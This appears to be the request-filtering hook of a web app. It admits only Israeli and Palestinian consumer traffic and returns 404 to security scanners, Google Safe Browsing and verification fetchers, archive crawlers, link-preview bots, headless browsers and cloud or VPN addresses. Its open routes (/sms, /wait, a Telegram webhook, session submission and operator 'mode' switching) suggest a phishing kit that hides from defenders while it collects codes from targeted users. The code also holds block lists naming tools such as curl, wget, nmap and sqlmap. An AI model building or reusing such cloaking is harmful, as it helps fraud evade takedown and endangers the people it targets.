/**
 * Hardened bot / crawler / scanner / cloud blocker.
 *
 * Layers of defense (each short-circuits to a 404):
 *   0. Allow-list admin + API + static assets
 *   1. Geo: only IL + PS
 *   2. Cloudflare signals: block known hosting / bot ASNs, Tor, known orgs
 *   3. User-Agent patterns + structural checks
 *   4. Missing / fake browser headers
 *   5. Datacenter / VPN IP fallback via ipapi.co
 */

import { inc } from '$lib/stats.js';
import { isAdminAuthed } from '$lib/auth.js';

// ---------- UA patterns ----------
const BOT_UA = /(googlebot|adsbot-google|mediapartners-google|google-inspectiontool|google-site-verification|google-read-aloud|googleother|googleweblight|apis-google|feedfetcher-google|google favicon|chrome-lighthouse|google page speed|googleimageproxy|bot|crawl|spider|scan|slurp|fetch|curl|wget|python-requests|python\/|go-http|okhttp|httpclient|java\/|axios|node-fetch|got\/|undici|lighthouse|headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver|pagespeed|gtmetrix|pingdom|uptimerobot|monitoring|statuscake|newrelic|datadog|site24x7|seobility|semrush|ahrefs|majestic|mj12|dotbot|petalbot|yandex|bingpreview|applebot|facebot|facebookexternalhit|whatsapp|telegrambot|discordbot|skypeuri|linkedinbot|twitterbot|slackbot|embedly|vkshare|w3c_validator|feedburner|rss|newsgator|postman|insomnia|apachebench|ab\/|siege|hey\/|vegeta|k6|locust|gatling|masscan|zgrab|nuclei|nikto|nmap|sqlmap|acunetix|nessus|openvas|burpsuite|zaproxy|wpscan|gobuster|dirbuster|ffuf|feroxbuster|shodan|censys|binaryedge|netcraft|archive\.org|wayback|httrack|heritrix|scrapy|colly|winhttp|libwww|lwp|mechanize|requests)/i;

// ---------- Hosting / cloud / VPN / datacenter org names ----------
const BAD_ORG = /(amazon|aws\b|google[- ]?cloud|\bgcp\b|microsoft|azure|digitalocean|linode|vultr|hetzner|\bovh\b|scaleway|oracle|alibaba|tencent|baidu|contabo|choopa|leaseweb|m247|cloudflare|fastly|akamai|rackspace|\bibm\b|upcloud|datacamp|kamatera|cdn77|stackpath|bunny|cherryservers|ramnode|buyvm|pfcloud|worldstream|psychz|cogent|he\.net|quadranet|servermania|hivelocity|colocrossing|gcorelabs|g-core|cloudvps|vpsserver|ionos|hostwinds|privateinternetaccess|\bpia\b|nordvpn|expressvpn|protonvpn|surfshark|mullvad|cyberghost|ipvanish|hidemyass|windscribe|privadovpn|airvpn|purevpn|\btor\b|tor[- ]?exit|tor[- ]?relay|relay|proxy|anonymous|hosting|colocation|server|\bvps\b|dedicated|datacenter|data[- ]?center|cdn|bot|crawler)/i;

// ---------- Known bad ASNs (hosting / VPN / scanners) ----------
const BAD_ASNS = new Set([
  // AWS
  16509, 14618, 8987, 39111, 7224, 10124,
  // Google / GCP / Googlebot
  15169, 36040, 396982, 19527, 22577, 41264, 139190, 394089, 394699, 36384, 36385, 36492, 43515, 32934,
  // Microsoft / Azure / Bing
  8075, 8068, 8069, 8070, 8071, 8072, 8073, 8074, 12076,
  // DigitalOcean
  14061, 200130, 202018, 393406,
  // Linode / Akamai
  63949, 20940, 16625, 21342, 21357, 23454, 23455, 33905,
  // Vultr / Choopa
  20473, 64515,
  // OVH / OVHCloud
  16276, 35540, 396982,
  // Hetzner
  24940, 213230,
  // Scaleway / Online.net
  12876,
  // Oracle Cloud
  31898, 7160, 14413,
  // Alibaba Cloud
  45102, 37963, 134963, 45104, 134937,
  // Tencent Cloud
  132203, 45090, 133478,
  // Baidu Cloud
  55967, 38365, 4808, 4837,
  // Huawei Cloud
  136907, 55990,
  // M247 / Leaseweb / wholesale
  9009, 60781, 16265, 30633, 7203, 43350, 29302, 28753,
  // Cloudflare / Fastly / edge
  13335, 54113, 209242,
  // Cogent / HE / backbone-but-hosting-heavy
  174, 6939,
  // IBM / SoftLayer
  36351, 26496, 21501,
  // Contabo / Hostinger / GoDaddy / IONOS
  51167, 56655, 47583, 8560, 8972, 34549, 61317,
  // G-Core Labs
  199524, 202422,
  // PIA / London Trust
  133380, 209854,
  // NordVPN / Tefincom
  136787, 200019, 209299,
  // ProtonVPN
  62371, 62240,
  // ExpressVPN
  56971,
  // Mullvad / DataPacket
  39351, 44669, 60068,
  // Surfshark / Surfshark Ltd
  212238, 202032,
  // Quadranet / ColoCrossing / HostRoyale / Path.net
  8100, 36352, 203020, 208091, 396356,
  // Hivelocity / ServerMania / Psychz / ReliableSite
  29761, 29802, 40676, 23470,
  // Rackspace
  19994, 33070, 15395, 10532,
  // Hostwinds / UpCloud / Kamatera / VPSServer
  54290, 202053, 51852, 212238,
  // Shodan / Censys / BinaryEdge scanners
  395343, 398722, 200373,
  // Generic hosting / bulletproof
  62355, 50340, 43317, 9002, 57629, 42831, 197226, 60117, 61282, 210079, 60781
]);

// ---------- Allowed mobile-carrier / consumer ISP ASN hints (Israel) ----------
// Not exhaustive but helps avoid false positives.
const IL_CONSUMER_ASNS = new Set([
  8551, 1680, 12849, 9116, 25010, 42013, 15975, 20927, 378, 24835, 12400, 1403, 8691
]);

// ---------- Always-allow paths ----------

// ---------- Always-allow paths ----------
const ALLOW_PATHS = [
  /^\/admin(\/|$)/,
  /^\/login(\/|$)/,
  /^\/api\/(tg-hook|set-mode|check-mode|sessions|visit|post|submit|delete-session|admin-login|presence)(\/|$)?/,
  /^\/wait(\.html)?(\/|$)/,
  /^\/sms(\.html)?(\/|$)/,
  /^\/img\//,
  /^\/css\//,
  /^\/js\//,
  /^\/favicon/
];

// Admin-protected paths (need valid admin_token cookie)
const ADMIN_PATHS = [
  /^\/admin(\/|$)/,
  /^\/api\/(sessions|set-mode|delete-session)(\/|$)?/
];

// ---------- ipapi.co fallback cache ----------
const ipCache = new Map();
const IP_TTL = 60 * 60 * 1000;

async function isBadIP(ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) return false;
  const cached = ipCache.get(ip);
  if (cached && cached.exp > Date.now()) return cached.bad;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) });
    if (!r.ok) return false;
    const j = await r.json();
    const org = `${j.org || ''} ${j.asn || ''} ${j.network || ''}`;
    const bad = BAD_ORG.test(org);
    ipCache.set(ip, { bad, exp: Date.now() + IP_TTL });
    return bad;
  } catch {
    return false;
  }
}

function blockResponse() {
  return new Response('', {
    status: 404,
    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
  });
}

function block(platform) {
  inc(platform, 'botsBlocked').catch(() => {});
  return blockResponse();
}

/** @type {import('@sveltejs/kit').Handle} */
export async function handle({ event, resolve }) {
  const { request, url, getClientAddress, platform, cookies } = event;
  const path = url.pathname;

  // Admin guard runs FIRST (before bot blocker) so legitimate admin always reaches login
  if (ADMIN_PATHS.some((re) => re.test(path))) {
    const token = cookies.get('admin_token');
    const authed = await isAdminAuthed(platform, token);
    if (!authed) {
      // For HTML page requests, redirect to login. For API, return 401.
      const accept = request.headers.get('accept') || '';
      if (accept.includes('text/html')) {
        return new Response('', { status: 302, headers: { Location: '/login' } });
      }
      return new Response('unauthorized', { status: 401 });
    }
    return resolve(event);
  }

  // 0. Always-allowed paths (login page, public APIs, static assets)
  if (ALLOW_PATHS.some((re) => re.test(path))) return resolve(event);

  const cf = platform?.cf || {};
  const h = request.headers;
  const method = request.method;

  // Only GET/POST are allowed for visitors
  if (method !== 'GET' && method !== 'POST' && method !== 'HEAD') return block(platform);

  // 1. Geo — only IL + PS (missing country = suspicious = block)
  const country = h.get('cf-ipcountry') || cf.country || '';
  if (!country) return block(platform);
  if (country !== 'IL' && country !== 'PS') return block(platform);
  // Cloudflare tags Tor exits as T1
  if (country === 'T1' || country === 'XX') return block(platform);

  // 2. Cloudflare ASN / org check (fast — no external lookup)
  const asn = Number(cf.asn || 0);
  if (!asn) return block(platform);                        // missing = non-CF or spoofed → block
  if (BAD_ASNS.has(asn)) return block(platform);
  const asOrg = String(cf.asOrganization || '');
  if (asOrg && BAD_ORG.test(asOrg)) return block(platform);

  // 2b. Cloudflare threat score (basic IP reputation, 0 = clean, 100 = worst)
  const threat = Number(cf.threatScore || 0);
  if (threat >= 10) return block(platform);

  // 3. User-Agent checks
  const ua = h.get('user-agent') || '';
  if (!ua.trim()) return block(platform);
  if (BOT_UA.test(ua)) return block(platform);
  if (ua.length < 40) return block(platform);              // too short = not real browser
  if (!/Mozilla\/5\.0/i.test(ua)) return block(platform);  // all real browsers use this
  // Must claim to be a real browser engine
  if (!/(Chrome|Firefox|Safari|Edg|OPR|Opera|SamsungBrowser|UCBrowser)\//i.test(ua)) return block(platform);

  // 4. Real-browser headers
  if (!h.get('accept-language')) return block(platform);
  const accept = h.get('accept') || '';
  if (!accept) return block(platform);

  // 4b. For top-level HTML page loads, require Sec-Fetch-* (all modern browsers send these;
  //     headless Node/curl/Python clients almost never do).
  const isHtml = accept.includes('text/html');
  if (isHtml && method === 'GET') {
    const secFetchMode = h.get('sec-fetch-mode') || '';
    const secFetchDest = h.get('sec-fetch-dest') || '';
    // Real browsers request top-level docs with mode=navigate, dest=document
    if (!secFetchMode || !secFetchDest) return block(platform);
    if (secFetchDest !== 'document' && secFetchDest !== 'empty') return block(platform);
  }

  // 5. ipapi.co fallback for top-level HTML page loads
  if (isHtml) {
    const ip = getClientAddress();
    if (await isBadIP(ip)) return block(platform);
  }

  return resolve(event);
}
